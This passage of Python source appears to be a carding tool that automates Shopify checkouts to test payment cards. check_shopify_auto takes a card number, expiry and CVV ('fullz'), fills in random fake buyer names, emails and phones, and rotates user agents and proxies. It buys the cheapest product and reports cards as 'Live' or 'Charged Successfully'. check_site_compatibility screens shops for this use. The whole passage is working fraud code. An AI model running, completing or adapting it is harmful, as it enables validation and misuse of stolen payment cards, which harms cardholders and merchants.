            'attemptToken': f'{checkout_token}-sf2faufd1sr',
            'metafields': [],
            'analytics': {
                'requestUrl': f'{site_url}/checkouts/cn/{checkout_token}/en-us?auto_redirect=false',
                'pageId': 'f8370824-43AF-4E52-894E-9ADC2D15FC36',
            },
        }
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': site_url,
            'referer': f"{site_url}/checkouts/",
            'user-agent': user_agent,
            'x-checkout-one-session-token': x_checkout_one_session_token,
        }
        
        response = await client.post(
            f"{site_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion",
            json={'query': SUBMIT_QUERY, 'variables': variables},
            headers=headers
        )
        
        if response.status_code == 200:
            data = response.json()
            
            if 'errors' in data:
                return {'error': data['errors']}
            
            submit_result = data.get('data', {}).get('submitForCompletion', {})
            result_type = submit_result.get('__typename')
            
            if result_type == 'SubmitRejected':
                errors = submit_result.get('errors', [])
                error_msgs = []
                raw_msg = 'Payment Rejected'
                for e in errors:
                    code = e.get('code', 'DECLINED')
                    msg = e.get('localizedMessage') or e.get('message') or ''
                    if msg:
                        error_msgs.append(f"{code}: {msg}")
                        if not raw_msg or raw_msg == 'Payment Rejected':
                            raw_msg = msg
                    else:
                        error_msgs.append(code)
                        raw_msg = code
                return {'rejected': True, 'errors': error_msgs, 'raw_response': raw_msg}
            
            if result_type in ['SubmitSuccess', 'SubmittedForCompletion']:
                receipt = submit_result.get('receipt', {})
                receipt_type = receipt.get('__typename')
                
                if receipt_type == 'ProcessingReceipt':
                    receipt_id = receipt.get('id')
                    poll_delay = receipt.get('pollDelay', 500)
                    session_token = receipt.get('purchaseOrder', {}).get('sessionToken', x_checkout_one_session_token)
                    
                    await asyncio.sleep(poll_delay / 1000.0)
                    final_receipt = await poll_for_receipt(site_url, receipt_id, session_token, user_agent, client)
                    return final_receipt
                
                elif receipt_type == 'ProcessedReceipt':
                    return {'success': True, 'receipt': receipt, 'raw_response': 'Payment Approved - Order Placed'}
                
                elif receipt_type == 'ActionRequiredReceipt':
                    action = receipt.get('action', {})
                    action_type = action.get('__typename', '3D Secure Required')
                    return {'3ds_required': True, 'receipt': receipt, 'raw_response': f'{action_type} - Card is Live'}
                
                elif receipt_type == 'FailedReceipt':
                    error = receipt.get('processingError', {})
                    code = error.get('code', 'DECLINED')
                    raw_msg = error.get('messageUntranslated') or error.get('message') or ''
                    if not raw_msg:
                        raw_msg = get_decline_reason(code)
                    return {'failed': True, 'error': error, 'raw_response': raw_msg}
            
            return data
        else:
            return None
    except Exception as e:
        return {'error': str(e)}


def get_decline_reason(code):
    """Get human-readable decline reason from error code"""
    decline_reasons = {
        'CARD_DECLINED': 'Your card was declined',
        'INSUFFICIENT_FUNDS': 'Insufficient funds',
        'EXPIRED_CARD': 'Card has expired',
        'INVALID_CVC': 'Invalid security code (CVV)',
        'INVALID_NUMBER': 'Invalid card number',
        'PROCESSING_ERROR': 'Processing error',
        'CALL_ISSUER': 'Contact card issuer',
        'PICK_UP_CARD': 'Card reported lost/stolen',
        'DO_NOT_HONOR': 'Transaction not approved',
        'GENERIC_DECLINE': 'Card declined',
        'FRAUDULENT': 'Transaction flagged as fraudulent',
        'LOST_CARD': 'Card reported lost',
        'STOLEN_CARD': 'Card reported stolen',
        'TRY_AGAIN_LATER': 'Try again later',
        'INCORRECT_CVC': 'Incorrect CVV code',
        'INCORRECT_NUMBER': 'Incorrect card number',
        'INCORRECT_ZIP': 'Incorrect billing ZIP code',
        'INVALID_EXPIRY_MONTH': 'Invalid expiry month',
        'INVALID_EXPIRY_YEAR': 'Invalid expiry year',
        'CARD_NOT_SUPPORTED': 'Card type not supported',
        'CURRENCY_NOT_SUPPORTED': 'Currency not supported',
        'DUPLICATE_TRANSACTION': 'Duplicate transaction',
        'REENTER_TRANSACTION': 'Please try again',
        'TRANSACTION_NOT_ALLOWED': 'Transaction not allowed',
        'WITHDRAWAL_COUNT_LIMIT_EXCEEDED': 'Withdrawal limit exceeded',
    }
    return decline_reasons.get(code, f'Card Declined ({code})')


async def poll_for_receipt(site_url, receipt_id, session_token, user_agent, client):
    try:
        variables = {
            'receiptId': receipt_id,
            'sessionToken': session_token,
        }
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': site_url,
            'referer': f"{site_url}/checkouts/",
            'user-agent': user_agent,
            'x-checkout-one-session-token': session_token,
        }
        
        max_polls = 10
        for poll_count in range(max_polls):
            response = await client.post(
                f"{site_url}/checkouts/unstable/graphql?operationName=PollForReceipt",
                json={'query': POLL_QUERY, 'variables': variables},
                headers=headers
            )
            
            if response.status_code == 200:
                data = response.json()
                receipt = data.get('data', {}).get('receipt', {})
                receipt_type = receipt.get('__typename')
                
                if receipt_type == 'ProcessingReceipt':
                    poll_delay = receipt.get('pollDelay', 500)
                    await asyncio.sleep(poll_delay / 1000.0)
                    continue
                
                elif receipt_type == 'ProcessedReceipt':
                    return {'success': True, 'receipt': receipt, 'raw_response': 'Payment Approved - Order Placed'}
                
                elif receipt_type == 'ActionRequiredReceipt':
                    action = receipt.get('action', {})
                    action_type = action.get('__typename', '3D Secure Required')
                    return {'3ds_required': True, 'receipt': receipt, 'raw_response': f'{action_type} - Card is Live'}
                
                elif receipt_type == 'FailedReceipt':
                    error = receipt.get('processingError', {})
                    code = error.get('code', 'DECLINED')
                    raw_msg = error.get('messageUntranslated') or error.get('message') or ''
                    if not raw_msg:
                        raw_msg = get_decline_reason(code)
                    return {'failed': True, 'error': error, 'raw_response': raw_msg}
        
        return {'timeout': True, 'raw_response': 'Request Timeout'}
    except Exception as e:
        return {'error': str(e)}


async def check_site_compatibility(site_url, proxy=None):
    """
    Check if a Shopify site is compatible with auto checkout.
    Returns (is_compatible, details_dict)
    """
    if not site_url.startswith('http'):
        site_url = f'https://{site_url}'
    site_url = site_url.rstrip('/')
    
    proxies = None
    if proxy:
        parts = proxy.split(':')
        if len(parts) == 4:
            proxies = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
            proxies = f"http://{parts[0]}:{parts[1]}"
    
    try:
        async with httpx.AsyncClient(timeout=30.0, follow_redirects=True, proxy=proxies) as client:
            # Check 1: Can fetch products
            product = await fetch_cheapest_product(site_url, client)
            if not product:
                return False, {'error': 'No products available'}
            
            # Check 2: Can add to cart
            variant_id = product['variant']['id']
            product_id = product['product']['id']
            cart_item = await add_to_cart(site_url, variant_id, product_id, client)
            if not cart_item:
                return False, {'error': 'Cannot add to cart'}
            
            # Check 3: Can get cart token
            cart_token = await get_cart_token(site_url, client)
            if not cart_token:
                return False, {'error': 'Cannot get cart token'}
            
            # Check 4: Can navigate to checkout
            checkout_data = await navigate_to_checkout(site_url, cart_token, client)
            if not checkout_data:
                return False, {'error': 'Cannot access checkout'}
            
            # Check checkout type
            if checkout_data.get('is_legacy'):
                checkout_type = 'Legacy (Fallback)'
            elif checkout_data.get('x_checkout_one_session_token'):
                checkout_type = 'Modern GraphQL'
            else:
                return False, {'error': 'No checkout session found'}
            
            return True, {
                'price': product['price'],
                'product': product['product'].get('title', 'Unknown'),
                'checkout_type': checkout_type
            }
    except Exception as e:
        return False, {'error': str(e)[:50]}


async def check_shopify_auto(site_url, cc, mm, yy, cvv, proxy=None):
    """
    Main function to check card via Shopify auto checkout
    Returns a dict with status and message
    proxy format: ip:port or ip:port:user:pass
    """
    start_time = time_module.time()
    
    if not site_url.startswith('http'):
        site_url = f'https://{site_url}'
    site_url = site_url.rstrip('/')
    
    fullz = f"{cc}|{mm}|{yy}|{cvv}"
    
    user_data = {
        'first_name': random.choice(FIRST_NAMES),
        'last_name': random.choice(LAST_NAMES),
        'email': generate_random_email(),
        'phone': generate_random_phone(),
        'address': FIXED_ADDRESS,
        'user_agent': random.choice(USER_AGENTS),
    }
    
    proxies = None
    if proxy:
        parts = proxy.split(':')
        if len(parts) == 4:
            proxies = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
            proxies = f"http://{parts[0]}:{parts[1]}"
    
    try:
        async with httpx.AsyncClient(timeout=60.0, follow_redirects=True, proxy=proxies) as client:
            print(f"[SHOPIFY] Starting checkout for {site_url}")
            
            product = await fetch_cheapest_product(site_url, client)
            if not product:
                print(f"[SHOPIFY] No products found on {site_url}")
                return {
                    "status": "error",
                    "message": "No products available on site",
                    "time": round(time_module.time() - start_time, 2)
                }
            
            variant_id = product['variant']['id']
            product_id = product['product']['id']
            product_price = product['variant'].get('price', 'N/A')
            print(f"[SHOPIFY] Found product: {product['product'].get('title', 'Unknown')} - ${product_price}")
            
            cart_item = await add_to_cart(site_url, variant_id, product_id, client)
            if not cart_item:
                print(f"[SHOPIFY] Failed to add product to cart")
                return {
                    "status": "error",
                    "message": "Failed to add to cart",
                    "time": round(time_module.time() - start_time, 2)
                }
            
            cart_token = await get_cart_token(site_url, client)
            if not cart_token:
                print(f"[SHOPIFY] Failed to get cart token")
                return {
                    "status": "error",
                    "message": "Failed to get cart token",
                    "time": round(time_module.time() - start_time, 2)
                }
            print(f"[SHOPIFY] Cart token: {cart_token[:20]}...")
            
            checkout_data = await navigate_to_checkout(site_url, cart_token, client, debug=True)
            if not checkout_data:
                return {
                    "status": "error",
                    "message": "Failed to initialize checkout",
                    "time": round(time_module.time() - start_time, 2)
                }
            
            if checkout_data.get('is_legacy'):
                return {
                    "status": "error",
                    "message": "Legacy checkout not supported - use modern Shopify sites only",
                    "time": round(time_module.time() - start_time, 2)
                }
            
            if not checkout_data.get('x_checkout_one_session_token'):
                return {
                    "status": "error",
                    "message": "Failed to get checkout session token",
                    "time": round(time_module.time() - start_time, 2)
                }
            
            session_id = await create_payment_session(site_url, checkout_data, fullz, user_data, client)
            if not session_id:
                return {
                    "status": "error",
                    "message": "Failed to create payment session",
                    "time": round(time_module.time() - start_time, 2)
                }
            
            proposal_data = await send_proposal(site_url, checkout_data, session_id, user_data, product, client)
            if not proposal_data:
                return {
                    "status": "error",
                    "message": "Failed to send proposal",
                    "time": round(time_module.time() - start_time, 2)
                }
            
            seller_proposal = proposal_data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
            delivery = seller_proposal.get('delivery', {})
            
            if delivery.get('__typename') == 'PendingTerms':
                poll_delay = delivery.get('pollDelay', 500) / 1000
                await asyncio.sleep(poll_delay)
                proposal_data = await send_proposal(site_url, checkout_data, session_id, user_data, product, client)
                if not proposal_data:
                    return {
                        "status": "error",
                        "message": "Failed to poll proposal",
                        "time": round(time_module.time() - start_time, 2)
                    }
            
            cheapest_handle = proposal_data.get('cheapest_shipping_handle')
            cheapest_shipping_amount = proposal_data.get('cheapest_shipping_amount')
            final_total = proposal_data.get('checkout_total')
            
            if not cheapest_handle:
                return {
                    "status": "error",
                    "message": "No shipping options available",
                    "time": round(time_module.time() - start_time, 2)
                }
            
            signed_handle = None
            new_queue_token = checkout_data['queue_token']
            final_shipping_amount = cheapest_shipping_amount
            final_checkout_total = final_total
            final_proposal = None
            
            for attempt in range(5):
                final_proposal = await send_proposal(
                    site_url, checkout_data, session_id, user_data, product, client,
                    signed_handle=signed_handle, selected_handle=cheapest_handle, expected_total=final_checkout_total
                )
                
                if not final_proposal:
                    break
                
                negotiate_result = final_proposal.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                seller_proposal = negotiate_result.get('sellerProposal', {})
                
                if negotiate_result.get('queueToken'):
                    new_queue_token = negotiate_result.get('queueToken')
                
                if final_proposal.get('checkout_total'):
                    final_checkout_total = final_proposal.get('checkout_total')
                if final_proposal.get('selected_shipping_amount'):
                    final_shipping_amount = final_proposal.get('selected_shipping_amount')
                elif final_proposal.get('cheapest_shipping_amount'):
                    final_shipping_amount = final_proposal.get('cheapest_shipping_amount')
                
                delivery_expectations = seller_proposal.get('deliveryExpectations', {})
                
                if delivery_expectations.get('__typename') == 'PendingTerms':
                    poll_delay = delivery_expectations.get('pollDelay', 500) / 1000
                    await asyncio.sleep(poll_delay)
                    continue
                
                if delivery_expectations.get('__typename') == 'FilledDeliveryExpectationTerms':
                    expectations = delivery_expectations.get('deliveryExpectations', [])
                    if expectations and expectations[0].get('signedHandle'):
                        new_signed = expectations[0].get('signedHandle')
                        if new_signed != signed_handle:
                            signed_handle = new_signed
                            continue
                
                break
            
            if not final_proposal:
                return {
                    "status": "error",
                    "message": "Failed final proposal",
                    "time": round(time_module.time() - start_time, 2)
                }
            
            receipt = await submit_for_completion(
                site_url, checkout_data, session_id, user_data, product,
                cheapest_handle, final_shipping_amount, signed_handle, final_checkout_total, client, new_queue_token
            )
            
            elapsed = round(time_module.time() - start_time, 2)
            
            if not receipt:
                return {
                    "status": "error",
                    "message": "No response from payment",
                    "time": elapsed
                }
            
            raw_response = receipt.get('raw_response', 'No response')
            
            amount = final_checkout_total.get('amount', '0') if final_checkout_total else '0'
            currency = final_checkout_total.get('currencyCode', 'USD') if final_checkout_total else 'USD'
            
            if receipt.get('success'):
                return {
                    "status": "success",
                    "message": "Charged Successfully! Payment Approved",
                    "time": elapsed,
                    "charged": True,
                    "raw_response": raw_response,
                    "amount": amount,
                    "currency": currency
                }
            
            if receipt.get('3ds_required'):
                return {
                    "status": "success",
                    "message": "3D Secure Required - Card is Live",
                    "time": elapsed,
                    "raw_response": raw_response,
                    "amount": amount,
                    "currency": currency
                }
            
            if receipt.get('rejected'):
                errors = receipt.get('errors', ['Payment Rejected'])
                return {
                    "status": "declined",
                    "message": errors[0] if errors else "Payment Rejected",
                    "time": elapsed,
                    "raw_response": raw_response,
                    "amount": amount,
                    "currency": currency
                }
            
            if receipt.get('failed'):
                error = receipt.get('error', {})
                code = error.get('code', 'UNKNOWN')
                msg = error.get('messageUntranslated', 'Payment Failed')
                return {
                    "status": "declined",
                    "message": f"{code}: {msg}",
                    "time": elapsed,
                    "raw_response": raw_response,
                    "amount": amount,
                    "currency": currency
                }
            
            if receipt.get('error'):
                return {
                    "status": "error",
                    "message": str(receipt.get('error'))[:100],
                    "time": elapsed,
                    "raw_response": str(receipt.get('error'))[:100],
                    "amount": amount,
                    "currency": currency
                }
            
            raw_resp = receipt.get('raw_response', str(receipt)[:100])
            return {
                "status": "error",
                "message": "Unknown response",
                "time": elapsed,
                "raw_response": raw_resp,
                "amount": amount,
                "currency": currency
            }
            
    except asyncio.TimeoutError:
        return {
            "status": "error",
            "message": "Request timeout",
            "time": 60
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Error: {str(e)[:50]}",
            "time": round(time_module.time() - start_time, 2)
        }
